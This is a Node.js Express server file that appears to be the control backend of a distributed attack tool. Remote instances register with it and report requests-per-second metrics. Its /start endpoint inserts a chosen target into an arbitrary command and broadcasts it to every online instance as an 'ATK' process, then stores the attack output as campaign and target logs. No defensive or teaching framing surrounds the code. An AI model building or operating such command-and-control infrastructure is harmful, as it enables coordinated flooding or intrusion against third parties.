const express = require('express');
const app = express();
const { admin } = require('./db');
require('./cronJob');

const { parseOutput, formatIpAddress } = require('./util');
const db = admin.firestore();
const cors = require('cors');
const instancesCollection = db.collection('instances');
const targetLogsCollection = db.collection('target-logs');
const campaignsCollection = db.collection('campaigns');

app.use(cors({
    origin: ['http://localhost:5173'],
    methods: ['GET', 'POST'],
    credentials: true
}));

// Middleware to parse JSON bodies
app.use(express.json());

// Connect endpoint
app.post('/connect', async (req, res) => {
    try {
        // Get IP address from request
        const ipAddress = formatIpAddress(req.ip || req.connection.remoteAddress);

        // Generate unique instance ID if not provided
        const instanceId = req.body.instanceId || Date.now().toString();
        const serverRegion = req.body.region || 'None'

        // Create instance document 
        const instanceData = {
            instanceId: instanceId,
            region: serverRegion,
            status: "online",
            ipAddress: ipAddress,
            lastSeen: new Date().getTime(),
            rps: 0,
            gps: 0
        };

        // Add or update instance in Firestore
        await instancesCollection.doc(instanceId).set(instanceData, { merge: true });

        res.status(200).json({
            status: 'success',
            message: 'Instance connected successfully',
            instanceId: instanceId
        });
    } catch (error) {
        console.error('Error connecting instance:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to connect instance',
            error: error.message
        });
    }
});

// Update endpoint
app.post('/update', async (req, res) => {
    try {
        const { instanceId, rps, gps, processes } = req.body;

        if (!instanceId) {
            return res.status(400).json({
                status: 'error',
                message: 'Instance ID is required'
            });
        }

        const updateData = {
            lastSeen: new Date().getTime()
        };

        if (typeof rps === 'number') updateData.rps = rps;
        if (typeof gps === 'number') updateData.gps = gps;

        // Handle process output data
        if (processes?.ATK?.output) {
            const parsedOutputs = parseOutput(processes.ATK.output);
            
            // Use batch write for better performance
            const batch = db.batch();
            
            // Process each parsed output
            parsedOutputs.forEach((parsedOutput) => {
                const docRef = targetLogsCollection.doc();
                batch.set(docRef, {
                    ...parsedOutput,
                    instanceId,
                    servertime: new Date().getTime(),
                    createdAt: admin.firestore.FieldValue.serverTimestamp()
                });
            });

            // Commit the batch
            await Promise.all([
                instancesCollection.doc(instanceId).update(updateData),
                batch.commit()
            ]);
        } else {
            // If no process output, just update instance
            await instancesCollection.doc(instanceId).update(updateData);
        }

        res.status(200).json({
            status: 'success',
            message: 'Instance metrics updated successfully'
        });
    } catch (error) {
        console.error('Error updating instance metrics:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to update instance metrics',
            error: error.message
        });
    }
});

// Start campaign endpoint
app.post('/start', async (req, res) => {
    try {
        const { command, target } = req.body;

        if (!command || !target) {
            return res.status(400).json({
                status: 'error',
                message: 'Command and target are required'
            });
        }

        // Create campaign document
        const campaignData = {
            command,
            target,
            status: 'running',
            startTime: admin.firestore.FieldValue.serverTimestamp(),
            instances: []
        };

        // Add campaign to database
        const campaignRef = await campaignsCollection.add(campaignData);

        // Get all online instances
        const instancesSnapshot = await instancesCollection
            .where('status', '==', 'online')
            .where('lastSeen', '>', Date.now() - 60000) // Only instances seen in last minute
            .get();

        if (instancesSnapshot.empty) {
            await campaignsCollection.doc(campaignRef.id).update({
                status: 'failed',
                error: 'No online instances available'
            });

            return res.status(400).json({
                status: 'error',
                message: 'No online instances available'
            });
        }

        // Prepare command with target inserted
        const finalCommand = command.replace('{target}', target);

        // Send command to all online instances
        const sendPromises = instancesSnapshot.docs.map(async (doc) => {
            const instance = doc.data();
            const instanceIp = instance.ipAddress;
            
            try {
                // Send command to instance
                await axios.post(`http://${instanceIp}:3001/command`, {
                    action: 'start',
                    processId: 'ATK',
                    command: finalCommand
                });

                // Add instance to campaign's instances array
                await campaignsCollection.doc(campaignRef.id).update({
                    instances: admin.firestore.FieldValue.arrayUnion({
                        instanceId: doc.id,
                        ipAddress: instanceIp,
                        status: 'running'
                    })
                });

                return {
                    instanceId: doc.id,
                    status: 'success'
                };
            } catch (error) {
                console.error(`Failed to send command to instance ${doc.id}:`, error);
                
                // Add failed instance to campaign's instances array
                await campaignsCollection.doc(campaignRef.id).update({
                    instances: admin.firestore.FieldValue.arrayUnion({
                        instanceId: doc.id,
                        ipAddress: instanceIp,
                        status: 'failed',
                        error: error.message
                    })
                });

                return {
                    instanceId: doc.id,
                    status: 'failed',
                    error: error.message
                };
            }
        });

        // Wait for all instances to receive commands
        const results = await Promise.all(sendPromises);

        // Check if any instances succeeded
        const successfulInstances = results.filter(r => r.status === 'success').length;
        
        if (successfulInstances === 0) {
            await campaignsCollection.doc(campaignRef.id).update({
                status: 'failed',
                error: 'Failed to start campaign on any instance'
            });

            return res.status(500).json({
                status: 'error',
                message: 'Failed to start campaign on any instance',
                results
            });
        }

        res.status(200).json({
            status: 'success',
            message: 'Campaign started successfully',
            campaignId: campaignRef.id,
            totalInstances: results.length,
            successfulInstances,
            failedInstances: results.length - successfulInstances,
            results
        });

    } catch (error) {
        console.error('Error starting campaign:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to start campaign',
            error: error.message
        });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});